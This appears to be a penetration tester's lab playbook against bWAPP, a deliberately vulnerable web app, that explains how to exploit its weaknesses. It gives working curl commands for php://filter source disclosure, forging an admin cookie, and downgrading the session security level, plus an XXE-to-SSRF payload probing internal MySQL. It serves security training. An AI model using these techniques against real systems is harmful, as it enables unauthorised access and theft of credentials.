# Operator Playbook — bWAPP (2026-03-19-001)

## 1. Initial Mindset (What do we know?)
- **Target Type:** bWAPP (revisited for advanced techniques).
- **Goal:** Elevate simple LFI to source code exfiltration and exploit advanced Broken Authentication (cookie/URL manipulation).
- **Entry Point Assumption:** Known auth (bee:bug).
- **Strategy:** Using PHP Stream Wrappers to bypass execution and retrieve raw files.

## 2. First Action: Why We Scanned
- **WHY:** We are moving past "finding a bug" and toward "advanced exfiltration".
- **WHAT:** Searching for PHP source files that contain hardcoded credentials or database connection logic.

```bash
curl -b cookies.txt "http://10.10.30.128/rlfi.php?language=php://filter/convert.base64-encode/resource=admin/settings.php&action=go"
```

## 3. Decision Points & Thinking Process

### Decision: Using `php://filter` for Source Exfiltration
**Reason:** In typical LFI, `include("admin/settings.php")` would execute the code. We want to *read* the code.
- **Thinking:** The `php://filter` wrapper is a critical tool for operators. It allows us to apply a base64 conversion *before* the inclusion happens.
- **Decision:** Use `convert.base64-encode/resource=file.php`. This bypasses any execution and gives us the raw source in the HTTP response.
- **Command:** `curl -s -b cookies.txt "http://10.10.30.128/bWAPP/rlfi.php?language=php://filter/convert.base64-encode/resource=admin/settings.php&action=go"`
- **Result:** Successfully exfiltrated `admin/settings.php` revealing the database password (`root` / `""`).

### Decision: Exploiting "Client-Controlled" Auth (Broken Authentication)
**Reason:** At Medium security, many developers assume that moving an auth flag from a URL parameter to a cookie is "secure".
- **Thinking:** If the server doesn't verify the cookie's HMAC or sign it, the cookie is just as untrusted as a URL parameter.
- **Decision:** Forge the `admin=1` cookie.
- **Command:** `curl -b "PHPSESSID=$SESSID; security_level=1; admin=1" "http://10.10.30.128/smgmt_admin_portal.php"`
- **Reasoning:** By explicitly setting `admin=1`, we bypass the check on `smgmt_admin_portal.php`, which trusts the client to tell the server its privilege level.

### Decision: Transitioning XXE into SSRF for Port Probing
**Reason:** We knew from scan 1 that port 3306 (MySQL) was open internally.
- **Thinking:** Can we use the server's own network context to communicate with the DB?
- **Decision:** Use an `http://` entity in the XXE payload.
- **Payload:** `<!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">`
- **Logic:** If the server responds with an XML parse error containing binary data (the MySQL greeting), we have confirmed that SSRF is viable. This is a "banner grab" through a side channel.

### Decision: Downgrading the Security Level via Session State
**Reason:** Sometimes, the best attack is the simplest one: undoing the defensive logic.
- **Thinking:** The `security_level` is stored in the PHP session, which is initiated by the login form.
- **Decision:** Force a login with `security_level=0`.
- **Command:** `curl -c cookies.txt -X POST http://10.10.30.128/login.php -d "login=bee&password=bug&security_level=0&form=submit"`
- **Reasoning:** This is a meta-attack. By manipulating the session-creation step, we effectively disable all "Medium" level filters for every subsequent page we visit during that session.
